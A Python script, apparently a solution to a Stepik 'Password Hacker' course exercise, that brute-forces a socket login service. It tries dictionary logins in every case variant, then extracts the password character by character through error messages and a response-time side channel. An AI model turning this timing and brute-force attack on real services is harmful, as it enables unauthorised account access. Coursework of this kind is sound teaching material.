# write your code here
import socket
import sys
import string
import itertools
import requests as r
import json
import datetime


class Hacker:
    def __init__(self,
                 url_login_dict='https://stepik.org/media/attachments/lesson/255258/logins.txt',
                 url_password_dict='https://stepik.org/media/attachments/lesson/255258/passwords.txt'
                 ):
        self.ip_address = None
        self.port = None
        self.url_login_dict = url_login_dict
        self.url_password_dict = url_password_dict
        self.characters = string.ascii_letters + string.digits
        self.client_socket = socket.socket()
        self.found_login = None
        self.found_password = None

    @staticmethod
    def simple_brute_force_comb():
        alphanum = string.ascii_lowercase + string.digits
        length = 1
        while length <= len(alphanum):
            password_combinations = itertools.product(alphanum, repeat=length)
            length += 1
            for password in password_combinations:
                yield ''.join(password)

    @staticmethod
    def dict_based_cases_comb(url):
        response = r.get(url)
        for word in response.text.split():
            for credential in set(map(''.join, itertools.product(*zip(word.strip().upper(), word.strip().lower())))):
                yield credential

    def send_credentials(self, login, password):
        credentials = json.dumps({'login': login, 'password': password})
        credentials_encoded = credentials.encode()
        self.client_socket.send(credentials_encoded)
        response = self.client_socket.recv(1024)
        response = response.decode()
        return response

    def connect(self):
        login_combinations = self.dict_based_cases_comb(self.url_login_dict)
        args = sys.argv
        self.ip_address = args[1]
        self.port = int(args[2])
        with self.client_socket:
            try:
                self.client_socket.connect((self.ip_address, self.port))

                # try login first
                for login in login_combinations:
                    response = self.send_credentials(login=login, password='')
                    if json.loads(response)['result'] == 'Wrong password!':
                        self.found_login = login
                        break

                # once login is found try to build a password
                password = ''
                while True:
                    for symbol in self.characters:
                        start = datetime.datetime.now()
                        response = self.send_credentials(login=self.found_login, password=password + symbol)
                        finish = datetime.datetime.now()
                        if json.loads(response)['result'] == 'Exception happened during login' \
                                or (finish - start).total_seconds() > 0.05:
                            password += symbol
                        if json.loads(response)['result'] == 'Connection success!':
                            self.found_password = password + symbol
                            credentials = json.dumps({'login': self.found_login, 'password': self.found_password})
                            print(credentials)
                            break

            except (ConnectionRefusedError, ConnectionResetError, json.decoder.JSONDecodeError):
                pass


Hacker().connect()




















